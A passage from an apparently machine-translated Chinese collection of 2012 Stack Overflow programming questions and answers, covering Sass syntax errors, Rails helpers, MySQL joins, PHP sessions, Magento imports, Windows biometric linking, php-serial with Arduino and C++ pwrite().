org/jruby/RubyKernel.java:2096:in `send'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/visitors/perform.rb:7:in `visit'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/tree/root_node.rb:20:in `render'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/engine.rb:315:in `_render'
C:/Program Files (x86)/Scout/vendor/gems/gems/sass-3.2.1/lib/sass/../sass/engine.rb:262:in `render'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:140:in `compile'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:126:in `timed'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:139:in `compile'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/logger.rb:45:in `red'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:138:in `compile'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:118:in `compile_if_required'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:103:in `run'
org/jruby/RubyArray.java:1603:in `each'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:101:in `run'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:126:in `timed'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/compiler.rb:100:in `run'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/commands/watch_project.rb:147:in `recompile'
org/jruby/RubyMethod.java:133:in `call'
org/jruby/RubyProc.java:268:in `call'
org/jruby/RubyProc.java:228:in `call'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/path.rb:73:in `run_callback'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/path.rb:55:in `callback_action'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/path.rb:35:in `update'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/state/directory.rb:39:in `modified'
org/jruby/RubyArray.java:1603:in `each'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/state/directory.rb:37:in `modified'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/state/directory.rb:18:in `refresh'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/backends/polling.rb:17:in `run'
org/jruby/RubyArray.java:1603:in `each'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/backends/polling.rb:17:in `run'
org/jruby/RubyKernel.java:1419:in `loop'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/backends/polling.rb:15:in `run'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm/monitor.rb:26:in `run'
C:/Program Files (x86)/Scout/vendor/gems/gems/fssm-0.2.9/lib/fssm.rb:70:in `monitor'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/commands/watch_project.rb:87:in `perform'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/commands/base.rb:18:in `execute'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/commands/project_base.rb:19:in `execute'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/exec/sub_command_ui.rb:43:in `perform!'
C:/Program Files (x86)/Scout/vendor/gems/gems/compass-0.12.2/lib/compass/exec/sub_command_ui.rb:15:in `run!'
C:\Program Files (x86)\Scout\bin\compass:12:in `(root)'
*/
body:before {
  white-space: pre;
  font-family: monospace;
  content: "Syntax error: Invalid CSS after \"#sidebar_ad\": expected selector, was \"{\"\A         on line 1 of C:/test/style.sass\A \A 1: C:/UniServer/www/test/content/style.sass"; } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:06:12.577

您正在使用[Sass 语法](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#syntax)，它依赖于空格并且不使用括号或分号。你有两个选择：

用 Sass 而非 SCSS 编写代码。例如：

```
#sidebar_ad
  display: block
  width: 250px
  height: 150px 
```

或者将文件的扩展名从 更改`.sass`为`.scss`.

# css - Ruby on Rails - 在 css erb 文件中使用帮助程序会给出未定义的方法

> ID：13548129
> 
> 赞同：4
> 
> 时间：2012-11-25T04:00:46.593
> 
> 标签：css, ruby-on-rails-3, undefined, erb, helper

我有一个 css.erb 文件，其中包含我的一个页面的样式。我有一个助手，它根据该图像的位置预先格式化给定图像的 URL。

当我从视图调用辅助函数时，输出是预期的（包含图像 URL 的字符串）。但是，在 css.erb 文件中调用它会给我一个`undefined method`错误，即使我将相同的函数复制并粘贴到我的 css 文件中。

就好像帮助程序未包含在 css 文件中并被忽略。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-25T04:08:45.463

默认情况下，帮助程序不适用于模板化的 .css 文件。它们仅用于帮助构建视图。但是，您可以使用初始化程序尝试[此处](https://github.com/rails/rails/issues/3116)提到的解决方法：

```
Rails.application.assets.context_class.instance_eval do
  include YourHelperModule
end 
```

或者，如果您只需要一个或几个文件，您可以使用[此处](https://stackoverflow.com/questions/8932097/how-to-set-a-variable-from-a-helper-method-for-inclusion-in-a-sass-scss-styleshe)提到的解决方案，将以下代码添加到 .css.erb 文件的顶部：

```
<% environment.context_class.instance_eval { include YourHelperModule } %> 
```

# java - Java EE 应用程序客户端容器

> ID：13548130
> 
> 赞同：4
> 
> 时间：2012-11-25T04:01:07.387
> 
> 标签：java, jakarta-ee, webserver

Java EE 服务器有 3 种类型的容器

1.  EJB 容器

2.  网络容器

3.  我找到了一个定义说的应用程序客户端容器；

> 管理应用程序客户端组件的执行。客户端容器在客户端机器上运行。

但是我不明白 Java EE 容器如何驻留在客户端计算机上，而 EJB 和 Web 容器都运行在服务器上？

有人可以给我一个例子来说明应用程序客户端组件的真正含义吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:07:20.603

`Application client container`只不过是一组应用程序客户端，例如 EJB 客户端，以及所需的库和 Java 虚拟机（JVM）。

为了更好地理解，以 EJB 为例。您在应用程序服务器（EJB 容器）上开发和部署 EJB。现在，您可以分发您的 EJB 客户端 JAR 以及相关 JAR（如果有），这些 JAR 可用于使用在 JVM 上运行的简单 JAVA 客户端程序访问您部署的 EJB bean。此客户端执行环境称为`Application client container`.

此处提供更多详细信息：[应用程序客户端容器](http://docs.oracle.com/cd/E19229-01/819-0600/msgappclient.html)

# mysql - 如何将左外连接与喜欢/或喜欢一起使用

> ID：13548132
> 
> 赞同：0
> 
> 时间：2012-11-25T04:01:18.357
> 
> 标签：mysql, sql

我正在创建一个搜索功能。我的 sql 查询在 where 子句中使用`LIKE`and 。`OR LIKE`我正在搜索的表中的一个字段被调用`quantity_types`，它只存储与另一个表中找到的值相对应的代码。因此，要从另一个检索值，我想`Left Outer Join`在查询中使用 a 。

这是我的示例代码：

```
SELECT * FROM `pharmacy_items`
LEFT OUTER JOIN pharmacy_quantity_types
ON pharmacy_items.quantity_type = pharmacy_quantity_types.id
AND 'pharmacy_items.name' LIKE '%query_here%'
OR 'pharmacy_items.description' LIKE '%query_here%' 
```

此查询返回我的`pharmacy_items`表中的所有记录，而不是那些应该返回的记录，我没有使用`LEFT OUTER JOIN`.

我将如何构建我的查询，以使返回的结果首先`WHERE`满足`LEFT OUTER JOIN`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T04:05:23.917

听起来你想要这个：

```
SELECT *
  FROM pharmacy_items
  LEFT
 OUTER
  JOIN pharmacy_quantity_types
    ON pharmacy_items.quantity_type = pharmacy_quantity_types.id
 WHERE pharmacy_items.name LIKE '%query_here%'
    OR pharmacy_items.description LIKE '%query_here%' 
```

其中对`pharmacy_items`记录的限制在一个`WHERE`子句中而不是在一个`LEFT OUTER JOIN`'s`ON`子句中。

（另请注意：

*   `AND`具有更高的优先级`OR`，所以`a AND b OR C`意味着`(a AND b) OR c`，而我认为你想要`a AND (b OR C)`。上面的查询通过移动`b OR c`到一个子句隐式地解决了这个问题，所以无论如何`WHERE`它都是分开的。`a`
*   `'...'`是文字字符串，因此`'pharmacy_items.name'`表示“实际字符串`pharmacy_items.name`”，与“记录的`name`字段`pharmacy_items`”不同。后者是写`pharmacy_items.name`或``pharmacy_items`.`name``。）

)

# javascript - Ember.js 对象观察者是否等同于 ES6 Harmony Object.observe？

> ID：13548133
> 
> 赞同：5
> 
> 时间：2012-11-25T04:01:30.270
> 
> 标签：javascript, ember.js, ecmascript-harmony, object.observe

看着对象内部的新观察 ES6 功能，我想知道 Ember 和 ES6 是等价的还是不同的？我们可以在 ember 中安全地使用[Watchjs polyfill](https://github.com/melanke/Watch.JS)吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-07-31T03:38:00.233

> 看着对象内部的新观察 ES6 功能，我想知道 Ember 和 ES6 是等价的还是不同的？

绝对不同。EmberJs 有它自己的系统，其中每个“模型”（可以观察其属性的对象）都包装在`Ember.Object`. `Ember.Object`基类提供了侦听属性更改的所有机制。为了使用它们，所有需要做的就是访问和改变它的属性`.get()`。`.set()`

> 我们可以在 ember 中安全地使用 Watchjs polyfill 吗？

我以前没有尝试过，但我会警告不要这样做，因为我有根据的猜测是它**不会**起作用。这是因为，如上所述，Ember 依赖`get`ters 和`set`ters 来监听对象属性的变化，而不是`Object.observe`. 因此，即使您使用这个 WatchJs（或任何其他 polyfill），EmberJs 应用程序也会忘记这些更改，因为`Ember.Object`目前不理解或使用它。

# php - PHP - 登录脚本不创建会话

> ID：13548134
> 
> 赞同：0
> 
> 时间：2012-11-25T04:01:43.783
> 
> 标签：php, session

我有一个登录脚本，我已经能够成功地创建用户并登录。现在我的问题是，每当我尝试使用我的页面保护方法时，如果没有的话，我会查看是否有“用户”的会话将您引导回登录页面。

这是我检查会话，

```
require("common.php"); 

if(empty($_SESSION['user'])) 
{ 

    header("Location: login"); 

    die("Redirecting to login"); 
} 
```

这是我设置会话的地方，我只设置了 session_start(); 在 login.php 上

```
if($login_ok) 
    { 

        unset($row['salt']); 
        unset($row['password']); 

        $_SESSION['user'] = $row; 

        header("Location: home?worked=1"); 
        die("Redirecting to: home?worked=1");
        session_start(); 
    } 
    else 
    { 
        print("Login Failed."); 
        $submitted_username = htmlentities($_POST['username'], ENT_QUOTES, 'UTF-8'); 
    } 
} 
```

这是做什么的，是我登录，它会处理并将我带到我的主页，然后将标题处理回登录页面，就像我没有登录一样。我测试了一个错误的登录，它告诉它它正确的登录。

感谢您的帮助，我在这里拉头发！

死灵

**编辑**

我移动了 session_start(); 到我的common.php 的顶部，一切都很完美。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:02:50.850

You have `session_start();`after`$_SESSION['user'] = $row;` 实际上你有它在一个`die();`命令之后。之后什么也没有发生。

将`session_start();`PHP 放在每一页的顶部（首选 common.php，因为你有一个），而不仅仅是一页。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T04:06:11.673

最好设置`session_start()`在上面

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-25T04:06:49.713

你需要把 session_start(); 在您要使用会话的每个页面上。

# magento - Magento 导入 - 违反 FK 完整性约束

> ID：13548142
> 
> 赞同：1
> 
> 时间：2012-11-25T04:03:02.750
> 
> 标签：magento, magento-1.7

我正在以编程方式将产品从 XML 提要导入 Magento 1.7.0.2。

该脚本在一周的大部分时间里运行良好，但现在我在保存产品时收到如下所示的错误。

这个错误有多严重，是什么原因造成的？

我尝试重新索引所有内容并截断一堆表，错误似乎仍然存在。

错误：

```
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '51-1' for key 'UNQ_CATALOGINVENTORY_STOCK_ITEM_PRODUCT_ID_STOCK_ID' 
```

导入php（示例）：

```
$sProduct = $this->_productModel;       
$sProduct->setTypeId($this->_productTypeSimple)
  ->setWebsiteIds(array(1))
  ->setStatus($this->_productStatusDisabled)
  ->setVisibility($this->_productVisibilityNotVisible)
  ->setTaxClassId(2) //Taxable Good
  ->setAttributeSetId(XML_FEED_PRODUCT_ATTRIBUTE_SET)
  ->setSku($arrayProductData['ProductSKU']) 
  ->setName($arrayProductData['ProductName'])
  ->setShortDescription($arrayProductData['ProductShortDescription'])
  ->setDescription($arrayProductData['ProductLongDescription'])
  ->setPrice(sprintf("%0.2f", $arrayProductData['ProductPrice']))   
  ->setRRP(sprintf("%0.2f", $arrayProductData['ProductPrice'])) 
  ->setWeight(0)    
  ->setCategoryIds($arrayProductData['ProductCategories'])
  ->setUrlKey(str_replace(array(" ","'","&"),"-",$arrayProductData['ProductName']) . "-" . $arrayProductData['ProductSKU']);

$sProduct->setStockData(
  array( 
    'use_config_manage_stock' => 1,
    'is_in_stock' =>1, 
    'qty' => $arrayProductData['ProductStockQty'] 
  )
);

$sProduct->setMetaTitle($arrayProductData['ProductName'])
->setMetaDescription(str_replace("<<THE_PRODUCT>>",$arrayProductData['ProductName'], DEFAULT_META_DESC));           

if(isset($arrayProductData['ProductSize'])) {
  $sProduct->setData("sizes", $arrayProductData['ProductSize']);
}

if(isset($arrayProductData['ProductColour'])) {
  $sProduct->setData("color", $arrayProductData['ProductColour']);
}
try {
  $sProduct->save();            
}
catch (Mage_Core_Exception $e) {
  echo $e->getMessage();
} 
```

感谢您的关注。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T16:39:24.000

在脚本的下方，我根据某些标准创建可配置产品。

由于我尚未发现此可配置产品的 SKU 似乎不是唯一的原因，导致上述问题。

无论如何，谢谢梅贝德。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:35:42.633

如错误所示

UNQ_CATALOGINVENTORY_STOCK_ITEM_PRODUCT_ID_STOCK_ID

数据库表 ( cataloginventory_stock_item ) 中有相同 product_id / stock_id 的重复条目

这可能由于不同的原因而发生

您可以通过在保存之前手动设置产品 ID 来解决此问题，这样就不会冲突获取最后一个产品 ID 并增加它。

或在保存前从表中删除与此新产品相关的行

# visual-studio - 在我的 vc++ 项目中包含 lib 文件时需要帮助

> ID：13548143
> 
> 赞同：1
> 
> 时间：2012-11-25T04:03:09.663
> 
> 标签：visual-studio, visual-c++, dll, static-libraries, biometrics

首先，我是 Visual Studio 的初学者，所以如果我在某些方面出错，请原谅并指导我，我是 java 和 php 程序员，所以我对编程并不陌生

我想开发一个读取指纹的应用程序，我使用这个设备 [http://www.egistec.com/en/sensors/fingerprint-es603wb.aspx](http://www.egistec.com/en/sensors/fingerprint-es603wb.aspx) 我认为它使用 Windows 生物识别框架，所以我尝试运行中提到的代码此页面 [http://msdn.microsoft.com/en-us/library/windows/desktop/ee207405(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ee207405(v=vs.85).aspx)

这就是我所做的

```
#include "stdafx.h"
#include "Windows.h"
#include "Stdio.h"
#include "Conio.h"
#include "Winbio.h"

int _tmain(int argc, _TCHAR* argv[])
{ HRESULT CaptureSample(); } 
```

您可以在上面提供的第二个链接中找到函数 CaptureSample()。正如你在他们说要链接 Winbio.lib 中看到的，我知道它是 system32 中的一个 dll，我做了一些研究并创建了一个 Winbio.def 文件和 Winbio.lib 文件，

**现在我的问题是我不知道如何链接 lib 文件**，我在属性 >> LInker >> 附加依赖项中添加了“Winbio.lib”

它向我显示以下错误 *error LNK2019: unresolved external symbol _WinBioOpenSession@28* 实际上即使我从附加依赖项中删除它也会出现此错误

请告诉我哪里出错了，我应该将lib文件放在任何特定目录中吗？我应该在某处复制dll吗？或者是其他东西 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T05:43:35.200

Linker > General > Additional library Directoreis

把路径放到lib

链接器 > 输入

输入库名称。

如果你做一些谷歌搜索，你可以找到这个。

如果一切正常但仍然无法正常工作，则很可能是您的 lib 文件未正确生成。然后，您可以尝试使用动态加载您的 dll 文件。

[http://msdn.microsoft.com/en-us/library/ms810279.aspx](http://msdn.microsoft.com/en-us/library/ms810279.aspx)

首先调用 loadLibrary 来获取 dll 的句柄，然后调用 getProcAddress 来获取指向函数的指针。将指针转换为 h 文件中定义的目标函数。然后你就可以调用这个函数了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-08-26T08:15:58.460

我有同样的问题。以下步骤帮助我了解 VS 2015 社区版

1.  右键单击项目 > 属性。

2.  Linker > Input > 然后在 Addition Dependencies 中放 winbio.lib；到前面

# pdf - 提取PDF中的字体及其对应的cmap

> ID：13548147
> 
> 赞同：1
> 
> 时间：2012-11-25T04:04:32.890
> 
> 标签：pdf

我尝试了几种从pdf即提取字体的方法。C# 中的 fontforge、mupdf、pdfparser 以及一些 pythone 脚本。但我只是对获得精确的字体对及其嵌入 pdf 的 cmap 感到困惑。请指导我正确的方法，通过它我将获得精确的字体对及其 cmap。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T13:59:06.963

正如我在第一条评论中提到的，使用[iText 或 iTextSharp](http://itextpdf.com/)或任何其他允许您访问低级 PDF 对象的此类库应该很容易。

如果是 iText(Sharp)，[ListUsedFonts.java](http://itextpdf.com/examples/iia.php?id=287)和[ListUsedFonts.cs](http://kuujinbo.info/iTextInAction2Ed/index.aspx?ch=Chapter16&ex=ListUsedFonts)可以为您提供起点；他们检查通过至少一页可访问的 PDF 文件中的所有字体字典。而不是这些示例的简单输出，只需导出您需要的所有信息。为此，[ISO 32000-1:2008](http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/PDF32000_2008.pdf)应该是您的参考指南。

# php - php-serial 不工作

> ID：13548150
> 
> 赞同：7
> 
> 时间：2012-11-25T04:05:11.473
> 
> 标签：php, windows, serial-port, arduino

我正在尝试使用 PHP 让我的 Arduino 发出信号。每当我运行下面的代码时，它都会显示“无效的串口”，虽然它是有效的？

```
<?php

include 'serial_connect.php';

$serial = new phpSerial;

$serial->deviceSet("COM2");

$serial->deviceOpen();

$serial->sendMessage("1000");

$serial->deviceClose();
?> 
```

serial_connect.php 类是 php-serial，链接在这里：[http ://www.phpclasses.org/package/3679-PHP-Communicate-with-a-serial-port.html](http://www.phpclasses.org/package/3679-PHP-Communicate-with-a-serial-port.html)

这是我的 Arduino 草图：

```
int ledPin = 13;

void setup() {
    pinMode(ledPin, OUTPUT);
    Serial.begin(9600);
}

void loop() {
    if(Serial.available() > 0) {
        int time = Serial.parseInt();        
        digitalWrite(ledPin, HIGH);
        delay(time);
        digitalWrite(ledPin, LOW);
    }
} 
```

请帮忙。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-29T18:09:19.577

您没有在 PHP 代码中设置波特率。

您是否尝试过使用终端仿真器（如 Hyperterm）来确认您的串口连接正确？

您可能需要使用字符串`\\.\COM2`作为串行端口的名称——这就是我在我编写的 C 程序中所做的。请注意，您可能需要转义这些反斜杠：`"\\\\.\\COM2"`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-29T17:17:49.240

检查您的 COM2 是否已安装、启用并在设备管理器中正常工作（如果尚未安装）。还有你用的是什么型号的 Arduino？如果没有更多信息，我认为无法回答这个问题。将该信息添加到您的原始问题中可能是明智之举。此外，如果不注册帐户，我们将无法看到 php_serial 类的来源，我不希望这样做。我意识到这更像是一个评论而不是一个答案，但我需要更多的代表来评论（在我看来，这是 SO 声誉系统中的一个缺陷。）但是如果没有更多信息，最初的问题不会得到答案，所以我觉得有必要补充一下。祝你好运。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-10-04T15:23:34.887

PHP-serial 类代码中有几个错误。

开箱即用的 ttyUSB0 或 ttyACM0 函数 DeviceSet 在 linux 上不起作用；

函数 confstopbits，$this->os===osx 的 if 需要是 ELSEIF

然后，当尝试从 PI 或 BBB 连接到 Arduino 时，您需要 stty -F /dev/ttyACM0 ignpar 才能使其正常工作......

# php - 从我的在线网络应用程序触发物理“警察”灯

> ID：13548151
> 
> 赞同：0
> 
> 时间：2012-11-25T04:05:20.087
> 
> 标签：php, mysql, light

奇怪的问题，但只是在寻找指导或建议。我的网络应用程序具有协助操作员计时的功能。我的任务是从 mysql php 触发器打开红色闪光灯（警灯）？

可以这样做，因为我认为网站不能与我的硬件接口，或者是否有基于网络的“灯”可用？

或者，您是否有一个 USB 灯与可以与硬件通信的本地 mysql 数据库进行通信？

感谢您的时间和建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:13:04.477

没有奇怪的问题。您的问题可能与控制硬件主题的标签有关，但我不确定它们会是什么。

同时，这个可指导的“Arduino Internet 控制台灯”可能会有所帮助。

[http://www.instructables.com/id/Internet-Controlled-Desk-Lamp/?ALLSTEPS](http://www.instructables.com/id/Internet-Controlled-Desk-Lamp/?ALLSTEPS)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T04:14:05.963

你可以得到一个 Arduino，然后使用 php-serial 类来连接它。

# visual-studio-2008 - 开始执行时 MSTest.exe 挂起

> ID：13548155
> 
> 赞同：3
> 
> 时间：2012-11-25T04:06:03.160
> 
> 标签：visual-studio-2008, windows-server-2008, mstest

我有一个执行 Console.WriteLine() 的空白测试用例，当我尝试从命令行（或在 Visual Studio 2008 中）运行 MSTest.exe 时出现以下错误

> [V, 4004, 5, 2012/11/24 22:37:50.382] MSTest.exe：DIA 在检索符号时：System.Runtime.InteropServices.COMException (0x806D0005)：来自 HRESULT 的异常：Microsoft.VisualStudio.TestTools 的 0x806D0005 Microsoft.VisualStudio.TestTools.Common.DiaHelper.GetSymbolsFileName(String imagePath) 上的 .Common.Dia2Lib.IDiaDataSource.loadDataForExe(String executable, String searchPath, Object pCallback)

有什么想法吗？

# javascript - Javascript：距下一个生日的天数，来自数组中对象的日期属性

> ID：13548156
> 
> 赞同：1
> 
> 时间：2012-11-25T04:06:04.893
> 
> 标签：javascript, object, properties, countdown

本质上我无法弄清楚的是如何获取对象的 Date 属性（生日 - 从 HTML 中的 Date 类型输入中检索）并使用它向对象添加“距离下一个生日的天数”属性，例如：

```
var surnameField,firstNameField,birthdayField, phoneField, addressField, postField, emailField, groupField ;  //Declaring variables for the fields

var Contact = function(surname,firstName,date, phone , address , post, email, group){
    this.surname = surname ;
    this.firstName = firstName ;
    this.birthdayDate = new Date (date) ;
    this.phone = phone;
    this.address= address;
    this.email = email;
    this.post = post;
    this.group = group;

}

var contacts = [];

var getday = function() {

    for (var i= 0, j=contacts.length;i<j;i++){
       var a = contacts[i].birthdayDate.getDate();
        contacts[i].days = a;

    }
}

Contact.prototype.tableRow = function(){
    var tr = "<tr><td>" + this.surname + "</td><td>" + this.firstName + "</td><td>" + this.birthdayDate + "</td><td>" + this.phone + "</td><td>" + this.email +
            "</td><td>" + this.address + "</td><td>" + this.post + "</td><td>" + this.group + "</td></tr>";
    return tr;
}

var addContact = function(surnameField,firstNameField,birthdayField, phoneField, addressField, postField, emailField, groupField ){
        if(surnameField.value){
            a = new Contact(surnameField.value, firstNameField.value,birthdayField.value, phoneField.value, addressField.value, postField.value, emailField.value, groupField.value);
            contacts.push(a);
        }else{ alert("Please complete all fields")}

}

var clearUI = function(){
    var white = "#fff";
    surnameField.value = "";
    surnameField.style.backgroundColor = white;
    firstNameField.value = "";
    firstNameField.style.backgroundColor = white;
    birthdayField.value="";
    birthdayField.style.backgroundColor = white;
    phoneField.value = "";
    phoneField.style.backgroundcolor = white;
    addressField.value = "";
    addressField.style.backgroundcolor = white;
    postField.value = "";
    postField.style.backgroundcolor = white;
    emailField.value = "";
    emailField.style.backgroundcolor = white;
    groupField.value="";
    groupField.style.backgroundcolor = white;
}

var updateList = function(){
    var tableDiv = document.getElementById("table"),
        table = "<table border='2'><thead><th>  Surname  </th><th> First Name</th><th>Date of Birth</th><th>  Phone Number  </th><th>  Email Address </th><th>  Address  </th><th> Postcode  </th><th>Group</th></thead>";

    for (var i= 0, j=contacts.length;i<j;i++){
        var cntct = contacts[i];
        table += cntct.tableRow();
    }
    table +="</table>";
    tableDiv.innerHTML = table;
    //getday();
    saveContacts();

}

var add = function(){
    addContact(surnameField,firstNameField,birthdayField, phoneField, addressField, postField, emailField, groupField);
    clearUI();
    updateList();
};

var saveContacts = function(){
    var cntcts = JSON.stringify(contacts);
    if (cntcts !==""){
        localStorage.contacts = cntcts;
    }else{
        alert("Could not save contacts");
    }
}

var loadContacts = function(){
    var cntcts = "";
    if(localStorage.contacts !== undefined){
        cntcts = localStorage.contacts;
        contacts = JSON.parse(cntcts);
        var proto = new Contact();
        for (var i=0; i<contacts.length; i++){
            var cntct = contacts[i]
            cntct.__proto__ = proto;
        }
    }
}

var clearContacts = function(){
    contacts = [];
    updateList()

}

/*contacts.prototype.isDue = function(){
    var now = new Date();
    if(this.birthday > now){
        return false;
    } else {
        return true;
    }
};*/

window.onload = function(){
    loadContacts();
    updateList();
    surnameField = document.getElementById("surname");
    firstNameField = document.getElementById("firstName")
    birthdayField = document.getElementById("birthday");
    phoneField = document.getElementById("phone");
    addressField = document.getElementById("address");
    postField = document.getElementById("post");
    emailField = document.getElementById("email");
    groupField = document.getElementById("group");
    addButton = document.getElementById("addButton");
    addButton.onclick = add;
    delButton = document.getElementById("delButton");
    delButton.onclick = clearContacts;
    clearUI();
} 
```

我试图做的是从日期对象中获取 Days/Months 值并使用它来计算直到下一个生日的天数，但是我尝试过的一切似乎都不起作用。getDay() 和 getMonth() 在控制台中工作，但在实施时我得到一个“getDay 不是 .birthday 的 deinfed 方法”类型的错误。

所以理想情况下，一旦修复了数组中的每个对象，都应该有一个“daysTilBirthday”属性。

任何帮助将不胜感激。

**解决了**

我忘了添加检查以确保在重新加载数据时，它被重新加载为日期，而不是字符串，例如

cntct.birthdayDate = 新日期(cntct.birthdayDate);

还是要谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:11:26.083

尝试`birthday.getDate()`

这是小提琴：http: [//jsfiddle.net/ZJ6CN/](http://jsfiddle.net/ZJ6CN/)

# c++ - C++ pwrite(), pread() 数据到文本文件

> ID：13548161
> 
> 赞同：1
> 
> 时间：2012-11-25T04:06:44.370
> 
> 标签：c++, pointers

我必须将 pwrite() 字符写入文本文件，每个字符代表 1 个字节。另外，我需要将整数写入文本文件，所以 12 也必须是一个字节，而不是 2 个字节（即使是两个字符）。

我正在为字符和整数使用 char *pointer，但由于文本填充打印了整数的混乱值（@'s，颠倒的？'s 等），就像我 pwrite() 指针 [ 0] = 105；105 翻译 text.txt 文件中的“i”（并且 pread() 读取为“i”）不知何故 105 在翻译中丢失了。

任何想法如何正确地 pwrite()/pread() ？

```
ofstream file; file.open("text.txt");
char *characters = new char;
characters[0] = 105;
cout << pwrite(3, characters, 1, 0); 
```

另外，3 是文件，我猜 :-P 不知道如何实际找到。然后 text.txt 文件中包含“i”（我假设为 ASCII 105）。那么当我 pread() 时，我怎么知道它最初是 'i' 还是 105？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:50:31.720

把它分成几块：

> “我必须将 pwrite() 字符写入文本文件，每个字符代表 1 个字节”

根据定义，每个[ASCI 字符](http://www.asciitable.com) *是*一个字节，并且您没有提到需要编写区域设置感知的多字节字符或 Unicode 衍生物，所以我正在考虑这个您可能已经涵盖的内容。

> “另外，我需要将整数写入文本文件，所以 12 也必须是一个字节，而不是 2 个字节（即使是两个字符）”

您正在描述整数数据的二进制写入。但是，请记住，作为数字表示的“整数”可以大于仅由“一个字节”表示的数字。如果你想写*一个*可以用单个字节表示的整数，你的选择是：

1.  对于有符号数据，值的范围为 [-128,127]
2.  对于无符号数据，值的范围可以是 [0, 255]

这些是单个八位字节中整数值的限制。

> “我正在为字符和整数使用 char *pointer，但我被卡住了，因为文本填充打印了整数的混乱值（@'s，倒置的？'s 等）”

我们之前介绍过的字符的 char 指针，可能会很好。整数不会。根据您的描述，您生成的文件**不会**是字面意义上的“文本”文件。它将包含字符数据（您的字符缓冲区）和二进制数据（您的整数）。请记住，单个字节内的值为 0x01 的整数就是这样，一个设置了第一位的单个八位字节。代表 ASCI**字符**“1”的字节将具有值 0x31（请参阅任何[ASCI 图表](http://www.asciitable.com))，EBCDIC 的值为 0xF1（不要问）。使用您的示例，**您不能将值 12 写入单个字节并使其成为文件中可显示的“文本”（字符）数据。单字节整数值 12 将在您的文件中表示为单字节值 0x0C。试图将其视为“文本”是行不通的；它不是可打印的 ASCI。事实上，0x0C 的 ASCI 值实际上是一个换页控制字符。

最重要的是，如果您不知道 ASCI 字符和整数字节之间的区别，那么解释[`pwrite()`](http://linux.about.com/library/cmd/blcmdl2_pwrite.htm)工作原理不会有什么好处，反而会让您更加困惑。

> “就像我 pwrite() 指针 [0] = 105 时一样；105 在 text.txt 文件中翻译 'i' （并且 pread() 读为 'i'）不知何故 105 在翻译中丢失了”

请参阅此答案中链接多个位置的 ASCI 图表。字节值 105 实际上是字符“i”的 ASCI 值。105 没有丢失；它被显示为它所代表的字符。

最后，`pwrite()`是针对 Linux、BSD 和任何其他选择公开它的 POSIX 系统调用。它*不是*C 或 C++ 标准的一部分。也就是说，您的第一个参数 for`pwrite()`应该从系统调用中获得，[`open()`](http://pubs.opengroup.org/onlinepubs/000095399/functions/open.html). *除非您通过受支持的 API 来执行此操作，否则您永远*不应搭载假定由不同 api 调用打开的文件描述符。这个问题中的代码没有。

